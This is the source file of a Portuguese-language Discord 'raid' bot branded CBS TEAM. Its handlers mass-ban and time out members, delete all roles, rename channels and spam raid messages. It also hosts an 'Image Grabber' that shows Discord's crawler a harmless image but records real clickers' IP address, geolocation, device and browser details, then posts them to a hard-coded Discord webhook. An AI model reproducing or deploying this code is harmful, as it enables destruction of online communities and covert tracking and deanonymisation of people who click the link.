const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const dotenv = require('dotenv');
const cron = require('node-cron');
const express = require('express');
const fs = require('fs');
const path = require('path');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

client.commands = new Collection();
client.menuCommands = new Collection();
client.timers = new Map();

const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
const commands = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  if (command.data) {
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
  if (command.name) {
    client.menuCommands.set(command.name, command);
  }
}

client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} está online!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('🔄 Registrando comandos...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log(`✅ ${commands.length} comandos registrados!`);
  } catch (error) {
    console.error('❌ Erro:', error);
  }

  client.user.setPresence({
    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
    status: 'online'
  });

  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
  console.log('📋 Digite !menu no Discord');
  console.log('📸 Digite /img para gerar Image Grabber');
  console.log('💀 Digite /kill para destruir tudo (dono)');
});

// ============ SLASH COMMANDS ============
client.on('interactionCreate', async interaction => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction, client);
    } catch (error) {
      console.error(error);
      await interaction.reply({ content: '❌ Erro.', ephemeral: true }).catch(() => {});
    }
  }
});

// ============ MODAIS ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  const modalId = interaction.customId;

  if (modalId === 'editRaidModal') {
    const categoria = interaction.fields.getTextInputValue('categoriaInput');
    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
    const config = require('./config');
    if (categoria) config.raid.baseName = categoria;
    if (mensagem) config.raid.spamMessage = mensagem;
    await interaction.reply({
      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
      ephemeral: true
    }).catch(() => {});
  }

  if (modalId === 'renameModal') {
    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
    const nome = interaction.fields.getTextInputValue('nomeInput');
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
    if (tipo === 'canal') {
      const channels = guild.channels.cache.filter(c => c.type === 0);
      let count = 0;
      for (const [id, ch] of channels) {
        try { await ch.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, ephemeral: true }).catch(() => {});
    } else if (tipo === 'categoria') {
      const categories = guild.channels.cache.filter(c => c.type === 4);
      let count = 0;
      for (const [id, cat] of categories) {
        try { await cat.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, ephemeral: true }).catch(() => {});
    } else {
      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', ephemeral: true }).catch(() => {});
    }
  }

  if (modalId === 'banAllModal') {
    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', ephemeral: true }).catch(() => {});
    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, ephemeral: true }).catch(() => {});
    let banidos = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
      banidos += chunk.length;
      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`).catch(() => {});
    }
    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`).catch(() => {});
  }

  if (modalId === 'endModal') {
    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
    const duracao = minutos * 60 * 1000;
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Comando apenas em servidores.', ephemeral: true }).catch(() => {});
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId);
    if (members.size === 0) return interaction.reply({ content: '⚠️ Nenhum membro.', ephemeral: true }).catch(() => {});
    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, ephemeral: true }).catch(() => {});
    let timeoutados = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
      timeoutados += chunk.length;
      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`).catch(() => {});
    }
    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`).catch(() => {});
  }
});

// ============ !MENU ============
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('!')) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = client.menuCommands.get(commandName);
  if (!command) return;
  try {
    await command.execute(message, args, client);
  } catch (error) {
    console.error(error);
    await message.reply('❌ Erro.').catch(() => {});
  }
});

// ============ BOTÕES ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const mensagemSpam = 
    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;

  // ===== SPAM 1 VEZ =====
  if (interaction.customId === 'spam1') {
    await interaction.deferReply({ ephemeral: true }).catch(() => {});
    const channel = interaction.channel;
    if (!channel) {
      return interaction.editReply({ content: '❌ Canal não encontrado.', ephemeral: true }).catch(() => {});
    }
    let enviadas = 0;
    for (let i = 0; i < 1; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagem enviada!** 💬`).catch(() => {});
    return;
  }

  // ===== SPAM 2 VEZES =====
  if (interaction.customId === 'spam2') {
    await interaction.deferReply({ ephemeral: true }).catch(() => {});
    const channel = interaction.channel;
    if (!channel) {
      return interaction.editReply({ content: '❌ Canal não encontrado.', ephemeral: true }).catch(() => {});
    }
    let enviadas = 0;
    for (let i = 0; i < 2; i++) {
      try { await channel.send({ content: mensagemSpam }); enviadas++; } catch {}
    }
    await interaction.editReply(`✅ **${enviadas} mensagens enviadas!** 💬`).catch(() => {});
    return;
  }

  // ===== BOTÕES DO MENU =====
  const menuMap = {
    'menu_nuke': 'nuke',
    'menu_timer': 'timer',
    'menu_img': 'img',
    'menu_say': 'say',
    'menu_reverse': 'reverse',
    'menu_invite': 'invite',
    'menu_channelspam': 'channelspam',
    'menu_banall': 'banall',
    'menu_end': 'end',
    'menu_deleterole': 'deleterole'
  };

  if (menuMap[interaction.customId]) {
    const cmdName = menuMap[interaction.customId];
    const cmd = client.commands.get(cmdName);
    if (!cmd) {
      return interaction.reply({ content: '❌ Comando não encontrado.', ephemeral: true }).catch(() => {});
    }
    try {
      await cmd.execute(interaction, client);
    } catch (err) {
      console.error(err);
      await interaction.reply({ content: '❌ Erro.', ephemeral: true }).catch(() => {});
    }
    return;
  }

  // ===== BOTÃO PARAR TIMER =====
  if (interaction.customId === 'stop_timer') {
    const DONO_ID = '1409370594138525746';
    if (interaction.user.id !== DONO_ID) {
      return interaction.reply({ content: '❌ Apenas o dono pode parar o timer.', ephemeral: true }).catch(() => {});
    }

    let timerEncontrado = null;
    let timerKey = null;
    for (const [key, data] of client.timers) {
      if (data.channel.id === interaction.channel.id && data.ativo) {
        timerEncontrado = data;
        timerKey = key;
        break;
      }
    }

    if (!timerEncontrado) {
      return interaction.reply({ content: '❌ Nenhum timer ativo neste canal.', ephemeral: true }).catch(() => {});
    }

    timerEncontrado.ativo = false;
    if (timerEncontrado.timeout) clearTimeout(timerEncontrado.timeout);
    if (timerEncontrado.interval) clearInterval(timerEncontrado.interval);
    client.timers.delete(timerKey);

    const embedCancel = new EmbedBuilder()
      .setTitle('⏱️ TIMER CANCELADO')
      .setDescription('❌ O timer foi **cancelado** pelo dono.')
      .setColor(0xFF0000)
      .setTimestamp();

    try {
      const msg = await interaction.channel.messages.fetch(timerEncontrado.messageId);
      await msg.edit({ embeds: [embedCancel], components: [] });
    } catch {}

    await interaction.reply({ content: '✅ **Timer cancelado com sucesso!**', ephemeral: true }).catch(() => {});
    return;
  }

  // ===== BOTÕES DO KILL =====
  if (interaction.customId === 'kill_confirm') {
    const DONO_ID = '1409370594138525746';
    if (interaction.user.id !== DONO_ID) {
      return interaction.reply({ content: '❌ Apenas o dono pode executar esta ação.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });
    const killCmd = client.commands.get('kill');
    if (!killCmd) {
      return interaction.editReply({ content: '❌ Comando /kill não encontrado.' });
    }

    const mockInteraction = {
      ...interaction,
      options: {
        getBoolean: (name) => {
          if (name === 'confirmar') return true;
          return null;
        }
      },
      deferReply: async () => {},
      editReply: async (msg) => {
        await interaction.editReply(msg);
      },
      reply: async (msg) => {
        await interaction.reply(msg);
      }
    };

    try {
      await killCmd.execute(mockInteraction, client);
    } catch (err) {
      console.error(err);
      await interaction.editReply({ content: '❌ Erro ao executar /kill.' });
    }
    return;
  }

  if (interaction.customId === 'kill_cancel') {
    await interaction.reply({
      content: '❌ **Operação cancelada.**',
      ephemeral: true
    });
    return;
  }

  // ===== CONFIRMAR / CANCELAR DELETEROLE =====
  if (interaction.customId === 'confirmDeleteRoles') {
    const guild = interaction.guild;
    if (!guild) return interaction.reply({ content: '❌ Apenas em servidores.', ephemeral: true }).catch(() => {});
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    await interaction.deferReply({ ephemeral: true }).catch(() => {});
    let deletados = 0;
    const list = [...roles.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
      deletados += chunk.length;
      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`).catch(() => {});
    }
    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`).catch(() => {});
  }

  if (interaction.customId === 'cancelDeleteRoles') {
    await interaction.reply({ content: '❌ Cancelado.', ephemeral: true }).catch(() => {});
  }
});

// ==================== SERVIDOR HTTP E IMAGE GRABBER ====================
const app = express();
const port = process.env.PORT || 3000;
app.use(express.static('public'));
app.use(express.json());

const ipData = {};
const imageStore = {};

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528811226405142528/-b8_dqEYF8_QluNDfXYpyvar40PL9HD_-7OqHrZC5UbWJrjDk6Mmq3iwsktXZaHbSUP6';

// ===== FUNÇÃO PARA BUSCAR LOCALIZAÇÃO POR IP =====
async function buscarLocalizacao(ip) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
    const data = await response.json();
    if (data.status === 'success') {
      return {
        pais: data.country || 'Desconhecido',
        codigoPais: data.countryCode || '??',
        regiao: data.regionName || data.region || 'Desconhecido',
        cidade: data.city || 'Desconhecido',
        cep: data.zip || 'Desconhecido',
        lat: data.lat || null,
        lon: data.lon || null,
        isp: data.isp || 'Desconhecido',
        org: data.org || 'Desconhecido',
        as: data.as || 'Desconhecido',
        timezone: data.timezone || 'Desconhecido',
        mobile: data.mobile || false,
        proxy: data.proxy || false,
        hosting: data.hosting || false
      };
    }
    return null;
  } catch {
    return null;
  }
}

// ===== FUNÇÃO PARA ENVIAR WEBHOOK =====
async function enviarWebhook(id, dados) {
  if (!dados) return;
  
  if (dados.ehCrawler) return;

  const embed = {
    title: '📸 NOVO CLIQUE CAPTURADO!',
    color: 0xFF0000,
    fields: [
      { name: '🌐 IP', value: dados.ip || 'Desconhecido', inline: true },
      { name: '🌍 Localização', value: dados.localizacao || 'Desconhecido', inline: true },
      { name: '📱 Dispositivo', value: dados.device || 'Desconhecido', inline: true },
      { name: '💻 Navegador', value: dados.browser || 'Desconhecido', inline: true },
      { name: '📱 SO', value: dados.os || 'Desconhecido', inline: true },
      { name: '🖥️ User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
      { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
      { name: '🆔 ID', value: `\`${id}\``, inline: true },
      { name: '🔍 Origem', value: dados.origem || 'Desconhecido', inline: true },
      { name: '📶 ISP', value: dados.isp || 'Desconhecido', inline: true },
      { name: '🕐 Timezone', value: dados.timezone || 'Desconhecido', inline: true },
      { name: '🖥️ Resolução', value: dados.resolution || 'Desconhecido', inline: true },
      { name: '🌐 Idioma', value: dados.language || 'Desconhecido', inline: true },
      { name: '📱 Plataforma', value: dados.platform || 'Desconhecido', inline: true }
    ],
    footer: { text: 'CBS TEAM - Image Grabber' },
    timestamp: new Date()
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    console.log(`📨 Dados enviados para o webhook (ID: ${id})`);
  } catch (e) {
    console.error('❌ Erro ao enviar webhook:', e);
  }
}

// ===== ROTA PRINCIPAL: /img/:id =====
app.get('/img/:id', async (req, res) => {
  const id = req.params.id;
  const userAgent = req.headers['user-agent'] || 'Desconhecido';

  // ===== DETECTA CRAWLER DO DISCORD =====
  const ehCrawler = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com');
  if (ehCrawler) {
    let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
    if (!fs.existsSync(imagemPath)) {
      imagemPath = path.join(__dirname, 'public', 'imagem.png');
    }
    if (fs.existsSync(imagemPath)) {
      res.sendFile(imagemPath);
    } else {
      res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
    }
    return;
  }

  // ===== NÃO É CRAWLER – COLETA DADOS =====
  const forwarded = req.headers['x-forwarded-for'];
  let userIP = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
  if (userIP.includes('::1') || userIP === '127.0.0.1') userIP = '189.112.18.129';

  // ===== EXTRAI DADOS DO USER-AGENT =====
  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido', plataforma = 'Desconhecido';
  if (userAgent && userAgent !== 'Desconhecido') {
    if (userAgent.includes('Windows')) os = 'Windows';
    else if (userAgent.includes('Mac OS X')) os = 'MacOS';
    else if (userAgent.includes('Linux')) os = 'Linux';
    else if (userAgent.includes('Android')) os = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
    else if (userAgent.includes('CrOS')) os = 'Chrome OS';
    
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
    else if (userAgent.includes('Edg')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    else browser = 'Desconhecido';

    if (userAgent.includes('Mobile')) device = 'Celular';
    else if (userAgent.includes('Tablet')) device = 'Tablet';
    else device = 'Computador';

    if (userAgent.includes('Windows')) plataforma = 'Windows';
    else if (userAgent.includes('Mac OS X')) plataforma = 'macOS';
    else if (userAgent.includes('Linux')) plataforma = 'Linux';
    else if (userAgent.includes('Android')) plataforma = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) plataforma = 'iOS';
    else if (userAgent.includes('CrOS')) plataforma = 'Chrome OS';
  }

  // ===== DETECTA ORIGEM =====
  let origem = 'Desconhecido';
  if (userAgent.includes('Discord')) {
    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
      origem = '📱 Discord App (Mobile)';
    } else {
      origem = '💻 Discord App (Desktop)';
    }
  } else if (userAgent.includes('Mozilla') && browser === 'Chrome') {
    origem = '🌐 Navegador (Chrome)';
  } else if (userAgent.includes('Mozilla') && browser === 'Firefox') {
    origem = '🌐 Navegador (Firefox)';
  } else if (userAgent.includes('Mozilla') && browser === 'Safari') {
    origem = '🌐 Navegador (Safari)';
  } else if (userAgent.includes('Mozilla') && browser === 'Edge') {
    origem = '🌐 Navegador (Edge)';
  } else {
    origem = '🌐 Navegador (Desconhecido)';
  }

  // ===== BUSCA LOCALIZAÇÃO =====
  let localizacao = 'Desconhecido';
  let geo = null;
  if (userIP && userIP !== 'Desconhecido') {
    geo = await buscarLocalizacao(userIP);
    if (geo) {
      const coord = geo.lat && geo.lon ? ` (${geo.lat}, ${geo.lon})` : '';
      localizacao = `${geo.cidade}, ${geo.regiao}, ${geo.pais}${coord}`;
    }
  }

  // ===== SALVA DADOS =====
  ipData[id] = {
    ip: userIP,
    localizacao: localizacao,
    device: `${device} (${os})`,
    browser: browser,
    os: os,
    userAgent: userAgent,
    origem: origem,
    isp: geo?.isp || 'Desconhecido',
    timezone: geo?.timezone || 'Desconhecido',
    resolution: 'Aguardando...',
    language: 'Aguardando...',
    platform: plataforma,
    ehCrawler: false,
    timestamp: new Date().toISOString()
  };

  // ===== SERVE A PÁGINA HTML COM A IMAGEM E SCRIPT =====
  const imagemURL = imageStore[id] ? `/img/raw/${id}` : 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif';

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta property="og:image" content="${imagemURL}">
      <title>CBS TEAM</title>
      <style>
        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#0a0a0a; flex-direction:column; font-family:Arial, sans-serif; }
        img { max-width:90%; max-height:90%; border-radius:10px; }
        .loading { color:#ff0000; font-size:18px; margin-top:20px; animation:pulse 2s infinite; }
        @keyframes pulse { 0%{opacity:0.3;} 50%{opacity:1;} 100%{opacity:0.3;} }
      </style>
    </head>
    <body>
      <img src="${imagemURL}" alt="CBS TEAM">
      <div class="loading">🔥 CBS TEAM ESTEVE AQUI!</div>
      <script>
        const dados = {
          resolution: window.screen.width + 'x' + window.screen.height,
          language: navigator.language || navigator.languages[0] || 'Desconhecido',
          platform: navigator.platform || 'Desconhecido',
          timestamp: new Date().toISOString()
        };

        fetch('/api/coletar/${id}', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(dados)
        }).then(res => res.json())
          .then(data => console.log('✅ Dados enviados com sucesso:', data))
          .catch(err => console.error('❌ Erro ao enviar:', err));
      </script>
    </body>
    </html>
  `);
});

// ===== ROTA PARA RECEBER DADOS DO NAVEGADOR =====
app.post('/api/coletar/:id', express.json(), async (req, res) => {
  const id = req.params.id;
  const dadosNavegador = req.body;
  if (!ipData[id]) {
    return res.status(404).json({ error: 'ID não encontrado' });
  }

  ipData[id].resolution = dadosNavegador.resolution || 'Desconhecido';
  ipData[id].language = dadosNavegador.language || 'Desconhecido';
  ipData[id].platform = dadosNavegador.platform || ipData[id].platform || 'Desconhecido';

  await enviarWebhook(id, ipData[id]);

  res.json({ status: 'ok' });
});

// ===== ROTA PARA SERVER A IMAGEM PURA (RAW) =====
app.get('/img/raw/:id', (req, res) => {
  const id = req.params.id;
  let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
  if (!fs.existsSync(imagemPath)) {
    imagemPath = path.join(__dirname, 'public', 'imagem.png');
  }
  if (fs.existsSync(imagemPath)) {
    res.sendFile(imagemPath);
  } else {
    res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
  }
});

// ===== ROTA PARA VER DADOS =====
app.get('/dados/:id', (req, res) => {
  const id = req.params.id;
  if (ipData[id]) res.json(ipData[id]);
  else res.json({ error: 'Dados não encontrados' });
});

// ===== ROTA PRINCIPAL =====
app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));

app.listen(port, () => {
  console.log(`🌐 HTTP rodando na porta ${port}`);
  console.log(`📸 Image Grabber: https://cbsteam.onrender.com/img/ID`);
  console.log(`📨 Webhook configurado: ${WEBHOOK_URL}`);
});

// ==================== LOGIN ====================
client.login(process.env.DISCORD_TOKEN);

process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));